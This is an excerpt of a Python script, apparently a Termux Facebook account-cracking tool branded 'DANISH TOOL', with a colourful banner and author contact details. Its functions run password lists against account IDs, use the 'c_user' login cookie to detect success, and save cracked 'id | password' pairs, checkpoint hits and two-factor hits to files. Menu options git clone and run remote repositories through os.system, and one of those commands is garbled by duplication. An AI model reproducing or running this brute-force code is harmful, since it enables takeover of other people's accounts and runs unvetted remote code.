...
sys.stdout.write('\x1b[1;35m\x1b]2; DANISH \x07')
...
DANISH2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
\033[1;32m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝
             ...
             \033[1;34mHATER FEEL THE POWER  SARDAR BRAND                              

                  \033[1;35m+923463299102

\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗

\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mSARDAR DANISH LEGEND           \033[1;31m│

\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mTHEW SYCO SARDAR          \033[1;31m│

\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32mS9RD9R-BR9ND-420                   \033[1;31m │

\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mS9RD9R TRIICK3R 3M                  \033[1;31m   │

\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │

\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mDANISH TERMUX COMMAND\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
...
def saprate():
    ...
    print('\033[1;32m Example /sdcard/DANISH-81.txt')
...
def main():
    ...
    print("           \x1b[97m[\033[37;41m  WELCOME. TO DANISH TOOL \033[0;m] ")
...
def File_creating():
    ...
    os.system(f"git clone https://github.com/DANISH-king-06/DUMP && cd DUMP && python DUMP.py")

def PROTECT():

    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/DANISH-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")

def CYTHONIZER():

    os.system("rm -rf Cython_Changer && git clone https://github.com/DANISH-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")

def BOTX():

    os.system("rm -rf BOT && git clone https://github.com/DANISH-king-06/ BOT && cd BOTgit clone https://github.com/DANISH-king-06/ BOT && cd BOT && python3 DANISH.py")
...
def file_crack():
    ...
    opt_method = input(f'CHOOSE SERVER {DANISH2} : ')
    ...
    print('[•] OK IDS SAVE : /sdcard/DANISH_OK.txt\n[•] CP IDS SAVE : /sdcard/DANISH_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    sys.stdout.write(f'\r%s {WHITE}[DANISH 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                os.system("play-audio DANISH_OK.mp3")

                print('\r\033[1;32m[DANISH-OK] '+ids+' | '+pas+'\033[1;97m')

                ok.append(ids)

                open('/sdcard/DANISH_OK.txt', 'a').write(ids+' | '+pas+'\n')
                ...
                if 'Enter login code to continue' in str(d):
                    ...
                    os.system("play-audio DANISH_2F.mp3")

                    print('\r\033[1;35m[DANISH-2F] '+ids+' | '+pas+'\033[1;97m')

                    tf.append(ids)

                    open('/sdcard/DANISH_2F.txt', 'a').write(ids+' | '+pas+'\n')

                    break

                else:

                    os.system("play-audio DANISH_CP.mp3")

                    print('\r\033[1;31m[DANISH-CP] '+ids+' | '+pas+'\033[1;97m')

                    cp.append(ids)

                    open('/sdcard/DANISH_CP.txt', 'a').write(ids+' | '+pas+'\n')
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                print('\r\033[1;32m[DANISH-OK] '+ids+' | '+pas+'\033[0;97m')
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    ...
                    print('\r\033[1;35m[DANISH-2F] '+ids+' | '+pas+'\033[0;97m')
                    ...
                    print('\r\033[1;31m[DANISH-CP] '+ids+' | '+pas+'\033[0;97m')
...
def random_method(ids,passlist,total_ids):
    ...
    sys.stdout.write(f'\r{WHITE}[DANISH 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
        ...
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    print('\r\033[1;92m[DANISH-OK] '+cid+' | '+pas+'\033[0;97m')

                    ok.append(cid)

                    open('/sdcard/DANISH_OK.txt', 'a').write(cid+' | '+pas+'\n')
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        ...
                        print('\r\033[1;95m[DANISH-2F] '+cid+' | '+pas+'\033[0;97m')

                        tf.append(cid)

                        open('/sdcard/DANISH_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        ...
                        if cid in cp:
                            ...
                            print('\r\033[1;94m[DANISH-CP] '+cid+' | '+pas+'\033[0;97m')

                            cp.append(cid)

                            open('/sdcard/DANISH_CP.txt', 'a').write(cid+' | '+pas+'\n')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) DANISH
...
def pass1():
    ...
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/DANISH-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/DANISH-CP.txt')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/DANISH-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/DANISH-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    ...
                    open('/sdcard/DANISH-CP.txt', 'a').write(uid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[DANISH 🔥] [%s] \33[1;97m[OK:%s{DANISH2}CP:%s]'%(loop,len(ok),len(cp))), 
